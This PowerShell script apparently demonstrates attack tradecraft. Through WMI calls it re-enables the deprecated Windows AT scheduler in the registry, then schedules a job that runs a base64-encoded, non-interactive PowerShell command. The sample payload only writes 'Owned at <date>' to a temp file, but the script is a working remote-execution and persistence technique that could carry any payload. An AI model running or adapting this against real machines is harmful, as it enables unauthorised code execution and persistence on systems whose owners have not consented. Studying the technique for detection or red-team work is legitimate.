# This code could be used to remotely enable and launch AT jobs regardless of the fact that AT is deprecated in Win8+.

$HKLM = [UInt32] 2147483650

# Check to see if EnableAt is set
$Result = Invoke-CimMethod -Namespace root/default -ClassName StdRegProv -MethodName GetDWORDValue -Arguments @{
    hDefKey = $HKLM
    sSubKeyName = 'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\Configuration'
    sValueName = 'EnableAt'
}

# If EnableAt is not set, set it
if ($Result.ReturnValue -ne 0) {
    $Result = Invoke-CimMethod -Namespace root/default -ClassName StdRegProv -MethodName SetDWORDValue -Arguments @{
        hDefKey = $HKLM
        sSubKeyName = 'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\Configuration'
        sValueName = 'EnableAt'
        uValue = [UInt32] 1
    }

    $Result
}

# At this point, you'll need to wait for a reboot

# "Owned at $(Get-Date)" | Out-File "$($Env:TEMP)\payload.txt" -Append
$EncodedCommand = 'powershell.exe -noni -nop -enc IgBPAHcAbgBlAGQAIABhAHQAIAAkACgARwBlAHQALQBEAGEAdABlACkAIgAgAHwAIABPAHUAdAAtAEYAaQBsAGUAIAAiACQAKAAkAEUAbgB2ADoAVABFAE0AUAApAFwAcABhAHkAbABvAGEAZAAuAHQAeAB0ACIAIAAtAEEAcABwAGUAbgBkAA=='

Invoke-CimMethod -ClassName Win32_ScheduledJob -MethodName Create -Arguments @{
    Command = $EncodedCommand
    StartTime = (Get-Date).AddMinutes(2) # Execute two minutes from now
}

# The AT job will delete itself after it executes.
